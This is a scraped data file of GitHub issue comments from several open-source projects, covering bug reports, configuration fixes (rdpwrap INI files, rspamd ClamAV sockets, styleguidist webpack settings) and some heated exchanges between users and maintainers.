rdpwrap/stascorp/606/453778362,"hey newbie here ) trying to make this work on windows 10 pro 1809 17763.253 I seen a thread was opened already for 17763.253 and was closed  ticket advises this was a duplicate and links to this thread.... doe this mean I can use the fix here or that 1809 17763.253 isn't supported? basically what I'm trying to achieve here is to rdp into my account through my Mac's Microsoft Remote Desktop app while another user is using a different account on the same pc, is this possible? ",,False,False,606
rdpwrap/stascorp/606/455378657,"Hello, I modified the rdpwrapper.ini file and restarted the terservice, now rdpconf tells me that everything is fine (green listening and supported), but when I try to connect with the remote desktop, it terminates immediately without any error message. It seems that the PC is accepting the connections but it terminates them immediately after. Any help please. ",,False,False,606
rdpwrap/stascorp/606/455471714,"Thanks @friend , that has now got me to the next stage - it all now shows green and listening. However, I now have the same problem as @friend in that I can't connect from the remote computer. It terminates immediately when trying to connect. I get the same behaviour from the RDPWrap computer itself when using RDPCheck. ",,False,False,606
rdpwrap/stascorp/606/455473647,"I am busy at the moment, but will answer next week of course. I had the same Problem but got it working. I will answer Thanks Von meinem iPhone gesendet Am 18.01.2019 um 0953 schrieb ChrisH notifications@friend.com&lt;mailtonotifications@friend.com&gt; Thanks @friend , that has now got me to the next stage - it all now shows green and listening. However, I now have the same problem as @friend in that I can't connect from the remote computer. It terminates immediately when trying to connect. I get the same behaviour from the RDPWrap computer itself when using RDPCheck. — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub or mute the thread",,False,False,606
rdpwrap/stascorp/606/455476272,"Please retry all but WITHOUT the step 5 (so do not replace the termsrv.dll, keep the original one) I remember the problem was about the termsrv.dll !!! Von meinem iPhone gesendet Am 18.01.2019 um 0953 schrieb ChrisH notifications@friend.com&lt;mailtonotifications@friend.com&gt; Thanks @friend , that has now got me to the next stage - it all now shows green and listening. However, I now have the same problem as @friend in that I can't connect from the remote computer. It terminates immediately when trying to connect. I get the same behaviour from the RDPWrap computer itself when using RDPCheck. — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub or mute the thread",,False,False,606
rdpwrap/stascorp/606/455488763,working with this file - ini_rdpwrap.zip   ,,False,False,606
rdpwrap/stascorp/606/455501525,Finally working! Thanks @friend - that ini file did the trick (I copied back my original termsrv.dll v168 Home) I don't know what's going on but I tried multiple .ini files which people said were working for .168 and none of them worked till now. ,,False,False,606
rdpwrap/stascorp/606/455767840,i hav problem with rdp wrap winwer 10.0.17763.195 thx ,,False,False,606
rdpwrap/stascorp/606/457390175,"@friend, it's now been 7 weeks since this build was reported. INI files to rectify the issue have been available for most of that time. You seem to be still active on general issue admin, just curious as to why you haven't published the updated INI file/s? Is your plan for the future that everyone will download the tool, find it doesn't work and then have to read through issue tickets to teach themselves how to manually patch the INI file? ",,False,False,606
rdpwrap/stascorp/606/457394731,"I can't believe the INI file hasn't be updated at this URL yet?  is astounding, why has this not been updated? WTF is going on? ",,False,False,606
rdpwrap/stascorp/606/457415503,"Looking at   I submit to you that this project is dead, either temporarily or permanently, because binarymaster is very active on other projects that seem to interest him more. Looking at  it seems that  is the most active fork of this project and  is supported. I recommend you try out that fork and report back (post a comment here) whether it's worth moving on to greener pastures. ",,False,False,606
rdpwrap/stascorp/606/458309713,"Thanks @friend, have checked out tmaguire's fork but I can't see where to download the compiled installer and batch files - at  I can only download the source code. Any ideas? ",,False,False,606
rdpwrap/stascorp/606/458389661,@friend Not sure. I suggest asking the author directly. His email is listed here ,,False,False,606
react-native-router-flux/RNRF/2835/291947730,"Version  react-native-router-flux v4.0.0-beta.28 react-native v0.52.1 ## Actual behaviour throw error like below Unhandled JS Exception Error Route 'key0' should declare a screen. For example   import MyScreen from './MyScreen';   ...   key0 {       screen MyScreen,   }   ...    Expected behaviour then I import all business components into the entry file, and combine them into &lt;Router&gt;&lt;/Router&gt; wrap, it works, but I want organize my route in each business module, and export some module files, combine them in entry file finally. sorry i'm not good at English. please give me a hand, I can't thank you any more Steps to reproduce I export some Components from my business modules like below mm01.js (...some imports gose here) export default class MM01 extends Component{   render(){     return (       &lt;Scene key=""myModule01"" initial tabs&gt;           &lt;Scene key=""myModule010"" initial component={MM010}&gt;           &lt;Scene key=""myModule011"" component={MM011}&gt;           &lt;Scene key=""myModule012"" component={MM012}&gt;           &lt;Scene key=""myModule013"" component={MM013}&gt;       &lt;/Scene&gt;     );   } }  mm02.js (...some imports gose here) export default class MM02 extends Component{   render(){     return (       &lt;Scene key=""myModule02""&gt;           &lt;Scene key=""myModule020"" initial component={MM020}&gt;           &lt;Scene key=""myModule021"" component={MM021}&gt;       &lt;/Scene&gt;     );   } }  entry.js like below (...some imports gose here)  class App extends Component {     return (       &lt;Router&gt;           &lt;Scene key=""root""&gt;               &lt;MM01 /&gt;               &lt;MM02 /&gt;           &lt;/Scene&gt;       &lt;/Router&gt;     ); } AppRegistry.registerComponent('rnMbox', () =&gt; App);  ",,False,False,2835
react-native-router-flux/aksonov/2835/371040152,@friend Did you find a fix? Please help i'm having the same problem. ,,False,False,2835
react-native-router-flux/aksonov/2835/291947730,"Version  react-native-router-flux v4.0.0-beta.28 react-native v0.52.1 ## Actual behaviour throw error like below Unhandled JS Exception Error Route 'key0' should declare a screen. For example   import MyScreen from './MyScreen';   ...   key0 {       screen MyScreen,   }   ...    Expected behaviour then I import all business components into the entry file, and combine them into &lt;Router&gt;&lt;/Router&gt; wrap, it works, but I want organize my route in each business module, and export some module files, combine them in entry file finally. sorry im not good at english. please give me a hand, I can't thank you any more Steps to reproduce I export some Components from my business modules like below mm01.js (...some imports gose here) export default class MM01 extends Component{   render(){     return (       &lt;Scene key=""myModule01"" initial tabs&gt;           &lt;Scene key=""myModule010"" initial component={MM010}&gt;           &lt;Scene key=""myModule011"" component={MM011}&gt;           &lt;Scene key=""myModule012"" component={MM012}&gt;           &lt;Scene key=""myModule013"" component={MM013}&gt;       &lt;/Scene&gt;     );   } }  mm02.js (...some imports gose here) export default class MM02 extends Component{   render(){     return (       &lt;Scene key=""myModule02""&gt;           &lt;Scene key=""myModule020"" initial component={MM020}&gt;           &lt;Scene key=""myModule021"" component={MM021}&gt;       &lt;/Scene&gt;     );   } }  entry.js like below (...some imports gose here)  class App extends Component {     return (       &lt;Router&gt;           &lt;Scene key=""root""&gt;               &lt;MM01 /&gt;               &lt;MM02 /&gt;           &lt;/Scene&gt;       &lt;/Router&gt;     ); } AppRegistry.registerComponent('rnMbox', () =&gt; App);  ",,False,False,2835
react-native-router-flux/aksonov/2835/376113387,"@friend  @friend told the fix, Split your scenes to smaller parts if needed ",,False,False,2835
react-native-router-flux/aksonov/2835/402981467,How to use  to divide routers? ,,False,False,2835
react-native-router-flux/aksonov/2835/417559185,"Getting the same error as well with beta 31, the v3 method no longer works and the link above throws a  404 error ",,False,False,2835
react-native-router-flux/aksonov/2835/425080916,is this problem still going on ? ,,False,False,2835
react-native-router-flux/aksonov/2835/425715332,"seriously ! please don't write packages if you can't maintain them, fix the issues ",,False,False,2835
react-native-router-flux/aksonov/2835/425715422,v3 and beta are not supported. ,,False,False,2835
react-styleguidist/styleguidist/1044/339457727,"Hello, tell me please how to remove #! when pagePerSection true ",,False,False,1044
react-styleguidist/styleguidist/1247/398452934,"Current behavior When trying to build the styleguide with  after  and copying the  example components folder I'm getting this error To reproduce From my fork repository  you will get the error From scratch, inside the repo's folder run Then create  with this content (see #1243) Copy the components from the cra example folder And build it Here is when the error appears Expected behavior After running To have the static files located in the  folder. This already works for the original  example. ",,False,False,1247
react-styleguidist/styleguidist/1247/454564607,I'm running into this same problem... ,,False,False,1247
react-styleguidist/styleguidist/1247/454644352,"TLDR put the following add the following dangerouslyupdatewebpackconfig to your  file Root Cause Okay, I've tracked down the problem. With the newer version of  they use  and this is where the ""problem"" comes from. Some of the helper utils in that make some assumptions about the webpack config that are always true for their ""supported"" use cases. This particular problem comes from assuming there is a  property, basically, they are not null checking because in there use cases this is autogenerated if not provided. Styleguidist does take the output webpack config from  and merge it will it's own. Doing addresses most of these types of issues but it expelicitly ignores the output section. Fix The fix for this is that styleguidist should include a  property in the output section of the webpack config using  if present or  if not. I'm happy to submit a PR if @friend or similar are happy with this approach. Workaround until a fix is in you can use the  method to solve this. your  will look something like ",,False,False,1247
react-styleguidist/styleguidist/1247/454715435,Thanks for the investigation! I have some concerns on passing the app’s path or . Will this work fine when the style guide is deployed to a folder? For example . ,,False,False,1247
react-styleguidist/styleguidist/1247/454807646,"@friend I'll need to verify but create-react-app ""expects"" this pattern with its config so if you are using their webpack config you should be okay. I dug through all the code paths to figure out what  was getting set to. That said if you needed to change to a different path you could do something like  in your package.json. That said styleguidist could also just offer a config option and then just default to  if nothing is provided. ",,False,False,1247
react-styleguidist/styleguidist/1247/454819291,Requiring users to add a new config value for something that's already working without isn't an option. Can we pass something like an empty string? ,,False,False,1247
react-styleguidist/styleguidist/1247/454823120,"I'm not suggesting a required option just the ability to add one if you need since it's dependent on the webpack config you are using. This way instead of having to use  you would just set an optional config called, I don't know, . If the user sets it then we use that otherwise set it to empty string. then in make-webpack-config.js L37-L41 would become ",,False,False,1247
react-styleguidist/styleguidist/1247/454830755,Again you’re suggesting to introduce an option for a feature that already works out of the box. ,,False,False,1247
react-styleguidist/styleguidist/1247/454836340,It does not work out of the box with the latest versions of  you have to manaully write a webpack config and you cannot take advantage of the webpack config that ships with the app. it is perfectly acceptable if you do not want to support . please see  #1243 for the work around that allows you to point styleguidist at the webpack config that now ships with . Doing this will allow you to run a development version but will not allow you to build aka the source of this bug ,,False,False,1247
react-styleguidist/styleguidist/1247/463122425,"I also have this issue,  with the latest  runs ok, but  produces the above error. I agree with @friend, as of today it does not work out of the box. ",,False,False,1247
react-styleguidist/styleguidist/1247/463604717,"@friend The difference between  and  is the  variable, which is  when using , and  when using . I have found another workaround, that is to set ♠webpackConfig require('react-scripts/config/webpack.config')('development'),styleguide.config.jswebpackEnvdevelopmentReact Developer Tool` does not give any warning on the generated pages. ",,False,False,1247
react-styleguidist/styleguidist/1247/467434151,"@friend thank you, it works! Not sure what is the implication of always forcing the  config though. ",,False,False,1247
react-styleguidist/styleguidist/1247/467481444,"@friend you can use my suggested workaround and then you wont be in DEV all the time. I have a fork of a fix that does this for folks. HOWEVER, @friend claims this is not an actually issue and has stoped responding to my comments. ",,False,False,1247
react-styleguidist/styleguidist/1247/480802181,tada This issue has been resolved in version 9.0.6 tada The release is available on  npm package (@friend dist-tag) GitHub release  Your semantic-release bot packagerocket ,,False,False,1247
rspamd/vstakhov/1832/256508770,"Classification (Please choose one option)  [ ] Crash/Hang/Data loss [ ] WebUI/Usability [ ] Serious bug [ ] Other bug [ ] Feature [x] Enhancement  Reproducibility (Please choose one option)  [X] Always [ ] Sometimes [ ] Rarely [ ] Unable [ ] I didn’t try [ ] Not applicable  Rspamd version 1.6.4 Operation system, CPU, memory and environment Debian Stretch Description (Please provide a descriptive summary of the issue) The documentation on how to use ClamAV as a malware scanner should be improved. The defaults as defined in  do not work on Debian. The ""clamd"" process by default listens to the socket file /var/run/clamav/clamd.ctl and not on TCP port 127.0.0.13310. A working configuration would be (/etc/rspam.d/local.d/antivirus.conf) clamav {   action = ""reject"";   symbol = ""CLAM_VIRUS"";   type = ""clamav"";   log_clean = true;   servers = ""/var/run/clamav/clamd.ctl""; }  That also requires that the _rspamd user is part of the clamav group to be able to access the control socket. I suggest that this is made clearer. I would also like to suggest that an error is logged if the antivirus backend could not be reached. Such an error should not go unnoticed. Thanks. Steps to reproduce Install rspamd on Debian Stretch. Send a test virus (e.g. eicar.com). See in the logs that the antivirus module does nothing. ",,False,False,1832
rspamd/vstakhov/1832/328611040,"That's not Rspamd issue. We cannot fit all 100500 Linux distros in the world. Using of Unix sockets is extremely inconvenient because of the mess with permissions/groups and inability to dump traffic. I personally think that using of the unix socket is a very poor default. However, the default documentation clearly says that unix sockets usage is also possible. The errors are also logged properly, you are likely using the default  and clamav thus does not see  in a message itself. This logging part might be improved indeed. ",,False,False,1832
rspamd/vstakhov/1832/328642062,"Let's just say that the documentation of the antivirus module is very unspecific about what the defaults are. Quote # servers to query (if port is unspecified, scanner-specific default is used)  Without looking at the source code it's unclear what the default may be. Would be nice to put that into the configuration file as a comment for example. IMHO using sockets has pros and cons. The pro is that you don't open up a service for everyone on a host but just for those who you grant access. The con is that it may be harder to use if you get the permissions wrong and that tcpdump isn't working. I don't want to judge the respective distros' approaches. I'm just a stupid ignorant sysadmin who tried hard to get AV scanning working. ) And good documentation and clear error messages help with that. ",,False,False,1832
rspamd/vstakhov/1832/328773517,Forget about the sockets. I heard you. My point is the defaults are not documented (except in the source code (where the user is not looking)). ,,False,False,1832
rspamd/vstakhov/1832/328918489,"On Debian 9.... You need to specifiy the TCPAddr localhost TCPSocket 3310 in the clamav.conf so that rspamd can connect to it. And servers = ""127.0.0.13310""; in rspamd antivirus.conf Should work without issue. It is documented in both rspamd and clamav how to set the port/socket. ",,False,False,1832
rspamd/vstakhov/1832/354663692,"No, but your instructions mislead the user. Is this your intention? If not, then either correct your config example, or remove the example and refer the user to correct instructions ",,False,False,1832
rspamd/vstakhov/1832/397825707,"Look, if there's multiple, unrelated people coming here explicitly telling you there's documentation issues how big do you think the chance is that you're right in thinking there's no problem? ",,False,False,1832
rspamd/vstakhov/1832/397827759,Or even 146% as I'm inclined to ignore issues about the documentation without patches. ,,False,False,1832
rspamd/vstakhov/1832/397831697,It must be nice to be without doubt. You wrote good software. The way you act is why you don't automatically get the patches from everyone. Maybe one day you'll understand. Fare well. ,,False,False,1832
rspamd/vstakhov/1832/397832849,Your answer doesn't make any sense.  You documentation is wrong. It does not work. ,,False,False,1832
sass/sass/2507/316755092,"Regarding issue #132 Every language has string interpolation. Add the feature, stop being stubborn. Also in my opinion those who work for 30 years plus get stuck in their own (old) ways and don't like change. @friend . By expressing string interpolation is a bad idea, is just saying all other languages who have implemented it are wrong to do so. Also, closing/disabling comments is a bad form of censorship which goes agains Open-Source ideals. Please reconsider! and change old habits, they are toxic. ",,False,False,2507
sass/sass/2507/383721558,"Name-calling is not acceptable behavior, nor is attempting to re-open a locked issue. Don't do it again or you will be blocked from the Sass organization. ",,False,False,2507
screenshots/mozilla-services/4211/304007958,From discourse ,,False,False,4211
screenshots/mozilla-services/4211/372780566,"This was reported as producing the same name, but testing shows the filenames have a number in them, eg  file.png -&gt; file(1).png -&gt; file(2).png, etc.  I think it's put there by the browser?  So...we're going to close this. ",,False,False,4211
screenshots/mozilla-services/4211/387219338,"I'm on the latest Firefox 59.0.2, GNOME 3, and I'm experiencing the duplicate filenames issue. Steps to reproduce  Visit a website (e.g. this page on github). Take a screenshot of the visible part of the page. The save dialog appears with the Downloads directory open in it. Change the directory e.g. to Pictures. Save the screenshot. Take another screenshot of the visible part of the same page. The save dialog appears, and it shows the Downloads directory again. As there is no file with this name in this directory, ""(1)"" is not appended. Change directory to Pictures. Try to save the screenshot, and the save dialog warns you that you are trying to overwrite the existing file.  Expected result No filename collision between the screenshots taken at different times. Actual result Screenshots taken at different times have the same filename, and the user is forced to manually rename the file. Additional comments ""(1)"", ""(2)"", etc. are really appended to the filename if you don't change the directory in the save dialog and just save everything to Downloads. But if you want to store the screenshots to a different directory, you are forced to select it manually each time which is annoying, and no ""(1)"", ""(2)"", etc. are appended in this case. The best solution in my opinion is to just include a timestamp (including seconds) in the filename. ",,False,False,4211
screenshots/mozilla-services/4211/387225997,"@friend Thanks for the feedback. This bug has been closed as a wontfix, sorry. FWIW, on linux, you should be able to use something like  to auto-detect filesystem changes, and automatically rename any files matching the Screenshots initial part to include a local timestamp. I realize this isn't the answer you're after, but at least you can easily hack together a DIY solution plus one ",,False,False,4211
screenshots/mozilla-services/4211/387237824,Let's take a minute to chill. Locking this issue for now. ,,False,False,4211
screenshots/mozilla-services/4211/387234967,"ORLY? I can't see any mention of this resolution ITT. What I see is the following which means that the bug is closed as invalid/not reproduced. I suggest the steps to reproduce the bug so that you all could see that it's valid. So why not just follow the steps, reproduce the bug and reopen it, then fix it? It's trivial to fix that little tiny thing that irritates and annoys a lot of users, but instead you suggest some ugly workarounds when it's Firefox Screenshots' job to name the files correctly. Instead of creating the file with the correct name, you suggest creating a file with a wrong name, running a daemon that runs inotify watches and renames them. And I strongly believe that you understand the consequences of that ""solution"" — it's easy enough to get into an inconsistent state, be it a power loss before renaming, or a daemon crash, etc. There is a kind of people who write low-quality bash scripts for everything with hardcoded , race conditions, improper escaping, etc. I'm not one of those people, and I'm not gonna turn my computer into a dump by writing buggy scripts when someone refuses to fix their buggy software. It's too sad to admit that the new Firefox has taken a self-destructive course. Firefox Screenshots demonstrate that perfectly. First half of the extensions is broken including the extension I used to take screenshots. Then Mozilla introduces a built-in screenshotting tool which is, by the way, inferior to the one I used before. And what we see here? A big blue Save button that sends my private data to the cloud instead of saving my screenshots (#3603). Ugly error messages when just following a normal user flow (#3964). Too many clicks to just save a screenshot — it takes me at least 5 clicks just to save a shot of a page when it had taken me only a single click when I used a third-party screenshotter extension. One screenshot a day limit (#4229, #4211). No way to customize the filename pattern (#4229). Doesn't remember the directory where I store all my screenshots (#4211). These all make this piece of software absolutely unusable. These are the real problems, because they break UX. However, from version to version, nothing changes in Firefox Screenshots, still the same problems, still unusable. And the developers just say they are not going to fix that. Firefox Screenshots' fate is sealed. Just like Firefox Hello, it started as a new good useful tool, but it will end up exactly the same way, because it doesn't seem to be developed any more. I beg my pardon for possibly rude voice, but I'm seriously concerned about my favorite browser's future, and such responses from the developers are no good sign. ",,False,False,4211
sentry-elixir/getsentry/282/336385490,"By specifying the below you are saying that for all combinations of software on which Elixir runs, your software runs. However, we already know that this isn't the case, because of existing (unresolved) bug reports related to parallel compilation; bugs your team has not addressed in an efficient or effective manner, I should add. So, before I will actually try to debug anything, I would like to hear from you -- the vendor -- what the dependencies actually are to make this work on generic Linux. Preferably I would like to see this fully automated in a script of some kind named . This script would check for the operating system, libraries on which it depends (which you have done partially, I believe already), OTP versions, etc. The script should output either an exit status of 0 signifying that a subsequent compile is guaranteed to work or an exit status of 1 when the system configuration is not OK with a list of errors of what's wrong. ",,False,False,282
sentry-elixir/getsentry/282/400836238,"In the future please link to the issues and errors that you are having. I understand you are having trouble and this is a very annoying bug. You must understand how hard it is to fix an issue when its not easy to reproduce your self. The issue as presented is not a productive way to interact with any human being. It turns out that this is a bug in the Elixir Compiler and is being fixed for elixir 1.7.  issue is with how deps are being reported to sentry, the only fix at the moment would remove dep's from being reported at all until mix is fixed. We're discussing possible options and should have a fix out soonish. ",,False,False,282
sentry-elixir/getsentry/282/401079864,This should temporarily fix the issue. ,,False,False,282
silverstripe-framework/silverstripe/7761/288780107,"SS4.0 TextFieldcreate(&lt;name&gt;, &lt;value&gt;) OK HiddenFieldcreate(&lt;name&gt;, &lt;value&gt;) NOT OK. HiddenFieldcreate(&lt;name&gt;)-&gt;setValue(&lt;value&gt;) There is not reason to trip up new developers like this ",,False,False,7761
silverstripe-framework/silverstripe/7761/357897324,"@friend Can you provide more info on what specifically you expect to happen vs what’s actually happening? The second argument should be the title (that is, the “label” used when the field is displayed) - the third argument is for value - is that what’s causing your issue? It is a little strange to push a title to a  when that title will never be displayed, but it keeps that API (slightly) more consistent with other form field types ) ",,False,False,7761
silverstripe-framework/silverstripe/7761/357907773,"Your examples are wrong.  objects are ♠FormFieldcreate(&lt;name&gt;, &lt;label&gt;, &lt;value&gt;)` see ",,False,False,7761
silverstripe-framework/silverstripe/7761/358108717,No.  FormField from  that pattern for a hiddeen field does not work in the template as Results in ,,False,False,7761
silverstripe-framework/silverstripe/7761/358109888,@friend that all looks as expected... if you add and you'll get output ,,False,False,7761
silverstripe-framework/silverstripe/7761/358110254,The bug is that the interface for a text field and a hidden field are different.  IMO They should be the same. ,,False,False,7761
silverstripe-framework/silverstripe/7761/358110510,"can you explain in what way they are different, please? ",,False,False,7761
silverstripe-framework/silverstripe/7761/358110678,"TextFieldcreate(&lt;name&gt;, &lt;value&gt;); // OK HiddenFieldcreate(&lt;name&gt;, &lt;value&gt;); // NOT OK. ",,False,False,7761
silverstripe-framework/silverstripe/7761/358111475,"@friend - I'm sorry, you're not being clear. both of those work, don't result in error, output expected HTML/fields. Form what I can tell you actually are asking for these APIs to be different, not the same... You'd like 's second constructor argument to be the value and not the label, is that right? ",,False,False,7761
silverstripe-framework/silverstripe/7761/358112053,They produce different output. See above where I created an example and cut and pasted resulting HTML. ,,False,False,7761
silverstripe-framework/silverstripe/7761/358112899,"That is expected, the two examples you're giving are fundamentally different In the above code,  has no value set and just a name and label,  has a name and no label and a value is set. Therefore you'd expect different output and the output you've shown looks expected.  has no value and  does. ",,False,False,7761
silverstripe-framework/silverstripe/7761/358117341,No. produces produces Those are different. ,,False,False,7761
silverstripe-framework/silverstripe/7761/358117694,The second argument to the FormField is the value not a label according to the API documentation.  As I read it ,,False,False,7761
silverstripe-framework/silverstripe/7761/358118266,"Worik, sorry mate... I think you're confusing Title (ie. html ) and Value (ie. html attribute ). This is true for virtually every form field. Perhaps if you can provide a link to the documentation you're reading specifically, and what it is that has you turned around from it? ie. suggestions on how it could be clearer? Maybe the wording is a bit confusing. ",,False,False,7761
silverstripe-framework/silverstripe/7761/358120285,"I am showing you code I have been implementing. On close examinatuion the second argument for TextField constructor chould be 'Title' BUT, having missed that, I passed a value as the second argument to create(..) and hey presto it is the value.  Doing exactly the same pattern for HiddenField resulte in a different output. That is a bug.  I have reproduced it Ad nauseam Perhaps the TextFiled interface is buggy, I do not know,. it is the way it is used in the lessons, perhaps they are buggy too.  I do not know. But I do know this The interfaces to the HiddenField and TextField's create method are different when they should be the same. I have made that clear in examples above.  It is bnot a hypothesis but an observation. It may not seem like a bug to have idiosyncratic interfaces, but it makes life very difficult for new comers to the platform ",,False,False,7761
silverstripe-framework/silverstripe/7761/358120727,Test 1 Creates Test 2 Creates ,,False,False,7761
silverstripe-framework/silverstripe/7761/358122690,"@friend Is this SilverStripe 4.0? Lets step through it together ) public function __construct($name, $title = null, $value = '', $maxLength = null, $form = null)FormFieldHiddenField`. You can see this here ",,False,False,7761
silverstripe-framework/silverstripe/7761/358125941,"Whatever.  That is all nice theory.  But the facts, here are that the interfaces differ.  SS4.0 ",,False,False,7761
silverstripe-framework/silverstripe/7761/358127332,"I'm going to lock this topic, since it looks as if the original question has been answered adequately and the discussion seems to be degrading. Please keep in mind the SilverStripe code of conduct when contributing and responding to bug reports. Thanks =) ",,False,False,7761
silverstripe-framework/silverstripe/7761/358130059,@friend how about we catch up  on slack ) ,,False,False,7761
spring-cloud-sleuth/spring-cloud/991/326388352,&lt;dependencyManagement&gt;         &lt;dependencies&gt;             &lt;dependency&gt;                 &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;                 &lt;artifactId&gt;spring-cloud-sleuth&lt;/artifactId&gt;                 &lt;version&gt;2.0.0.RC1&lt;/version&gt;                 &lt;type&gt;pom&lt;/type&gt;                 &lt;scope&gt;import&lt;/scope&gt;             &lt;/dependency&gt;         &lt;/dependencies&gt;     &lt;/dependencyManagement&gt;     &lt;dependencies&gt;         &lt;dependency&gt;             &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;             &lt;artifactId&gt;spring-cloud-starter-sleuth&lt;/artifactId&gt;         &lt;/dependency&gt;         &lt;dependency&gt;             &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;             &lt;artifactId&gt;spring-cloud-sleuth-zipkin&lt;/artifactId&gt;         &lt;/dependency&gt;         &lt;dependency&gt;             &lt;groupId&gt;io.zipkin.brave&lt;/groupId&gt;             &lt;artifactId&gt;brave-instrumentation-mysql&lt;/artifactId&gt;             &lt;version&gt;4.13.1&lt;/version&gt;         &lt;/dependency&gt;         &lt;dependency&gt;             &lt;groupId&gt;mysql&lt;/groupId&gt;             &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;         &lt;/dependency&gt;         &lt;dependency&gt;             &lt;groupId&gt;io.zipkin.brave&lt;/groupId&gt;             &lt;artifactId&gt;brave-mysql&lt;/artifactId&gt;             &lt;version&gt;4.0.6&lt;/version&gt;         &lt;/dependency&gt; &lt;/dependencies&gt;  ,,False,False,991
spring-cloud-sleuth/spring-cloud/991/391947994,if you want us to help you have to stop re-opening issues and use gitter instead ok?   issues can cause some annoyance. you were asked to not open an issue and did it again. Moreover you opened an issue after already creating this one.. please don't behave like this as we want to help but it is hard when annoyed ok? ,,False,False,991
spring-cloud-sleuth/spring-cloud/991/391948579,"This problem has not been dealt with completely, you close, this behavior is too responsible, the first use of this, can not be more patient? ",,False,False,991
spring-cloud-sleuth/spring-cloud/991/391950035,"We've asked you to use gitter. that's how we support things. This needs to be investigated as a problem before using an issue. As mentioned in the issue template, issues are used for changes to the codebase. I don't think a change will occur here in this repository. Please don't make us block you. ",,False,False,991
spring-cloud-sleuth/spring-cloud/991/391949157,Your attitude of forcing closure without solving the problem is really disappointing ,,False,False,991
spring-cloud-sleuth/spring-cloud/991/391948789,I'm trying to make my point. How do you feel so impatient ,,False,False,991
spring-cloud-sleuth/spring-cloud/991/391950220,"I also asked you multiple times to provide your full codebase and instructions on how to replicate the issue. Also, I've asked you if you followed the guidelines in the brave-mysql instrumentation repo. You have provided no feedback and kept ignoring my questions. ",,False,False,991
spring-cloud-sleuth/spring-cloud/991/391953626,"you posted the issue twice.. here after posting here less than a day ago  are you not joining gitter like asked? do you feel that doing the opposite will make things better for either you or us, or the hundred people who are alerted when you post issues like this? The request on the issue is to please try the example, and if report back on gitter what happens. please do that and stop pasting things at us. it is easier and we can be friends as opposed to being frustrated ok? ",,False,False,991
styled-components/styled-components/1721/319437548,"@friend I am really don't know who is best person to address this question, I found greelen name first in the list so addressing you. I am creating component library for client which I am using as npm link to use it in create react app. But the question is component library project has no App container so I can not wrap it as  ♠&lt;ThemeProvider&gt; &lt;App /&gt; &lt;/ThemeProvider&gt;` So what is the alternate way I can use themeprovider? How can I use as importing to each component and use theme props? Please help. ",,False,False,1721
spring-cloud-sleuth/spring-cloud/991/391952484,"I didn't even come and provide the full code, so you shut down the problem ",,False,False,991
styled-components/styled-components/1721/385979587,"What component library tool are you using to develop? (storybook, styleguidist) They usually offer a way to have wrapper components. Let me know, and I can help you out. ",,False,False,1721
styled-components/styled-components/1721/386257667,Do I really need need storybook or styleguidist? Without container shouldn't I use theme provider? For now I have ex. colors.js where all colors are defined and I am importing that colors in every component. Is there any advantage using theme provider instead of this approach? And if yes then let me know how can I leverage theme provider without introducing any other third party library? ,,False,False,1721
styled-components/styled-components/1721/388521317,You don't technically need to use  to use styled-components. ,,False,False,1721
styled-components/styled-components/1721/388532413,"I think you don't understand what I meant. I said I want to apply theme to my styled component. Ex. Here is the code my styledLabel component import styled from 'styled-components'; import  as fonts from '../styles/fonts'; import  as colors from '../styles/colors'; ; module.exports = {   sidebar '#1D242D',   primary1 '#696D73',   primary2 '#535354',   primary3 '#929497',   canvas '#FFFFFF',   highlight '#4F80FF',   accent1 '#DBDCDF',   accent2 '#CCCCCC',   alarm '#EE4623',   background '#EDEEF1' }; ♠ Here if you can notice I have given color from color.js. @friend @friend is the same as wrapping component in ? ",,False,False,1721
styled-components/styled-components/1721/388533076,"@friend I don't think I understand your use case, unfortunately. That being said, if you aren't able to reliably wrap your entire app with a , you can alternatively wrap your individual components with it in the implementation. ; export default function ThemedButton(props) {   return (     &lt;ThemeProvider theme={theme}&gt;       &lt;Button {...props} /&gt;     &lt;/ThemeProvider&gt;   ); } ♠ For example. ",,False,False,1721
styled-components/styled-components/1721/388533869,"@friend can you please read entire thread first because your answers are irrelevant? @friend  If no body can answer from styled components team then please close this issue, because I am not getting proper answer. ",,False,False,1721
styled-components/styled-components/1721/388533922,I did read it and I said in my response I don’t understand your use case but am trying to help anyway. ,,False,False,1721
styled-components/styled-components/1721/388534034,"In case you didn’t know, we are all volunteers working on this project. Your attitude and sense of entitlement for a perfect solution to your mostly unelucidated use case is both rude and condescending. ",,False,False,1721
styled-components/styled-components/2426/416972322,"Can we hold Google chrome responsible for .iwuvb not being editable in a browser. I think the deliberate obfuscation built by Styled-Components in 100% negligent and generally affects my workflow negatively slowing it down 600%, but the fact that I cannot even manipulate the thing without rewriting it is complete BS. I cannot wait for this terrible of CSS-in-JS shim to be native and integrated with browser dev tools. In the meantime UI will move an a snails pace until Javascript Engineers and Browsers Engineers can all agree there is a visual element to UI and being able to see what I'm doing becomes again an element to the workflow of UI development. Being able to understand where .iubcx came from without the hacky babel plugin that's not even that helpful will be a step in the right direction. Why is using unique class names not used for building unique components who already have unique names? It's beyond me -- it seems like a personal attack on UI Engineers everywhere. ",,False,False,2426
stylus/openstyles/498/358652924," Browser Firefox 62 Operating System Windows 10  Noticed as a result of #461 and #497 - even when Stylus is disabled with the ""Turn all styles off"" option, it continues to inject a  element. It only stops injecting the style element when the configured styles that are applicable to the current page, are all individually disabled. ",,False,False,498
stylus/openstyles/498/419939352,"This is how Stylus (and its ancestor Stylish-for-Chrome) always worked so it's not related to the mentioned issues. I guess the reason is that the purpose of ""turn all styles off"" option is to toggle all styles quickly in case of problems or when writing styles. ",,False,False,498
stylus/openstyles/498/419943042,"Didn't say it was. Only said it was how I happened to notice it. I'd say the fact that Stylus currently breaks sites that try to read  in Firefox, as per above issues, is a pretty big problem. In the more broader sense if I tell an extension to temporarily ""hands off!"" and disable itself for a page; I expect it to ACTUALLY leave the page alone. Which Stylus doesn't do with the big panic button, that is specifically meant for these use-cases. It instead requires disabling each individual applied style... The fact that this is how Stylus 'alway worked' doesn't mean it is correct. ",,False,False,498
stylus/openstyles/498/419943735,You can simply disable the extension itself. ,,False,False,498
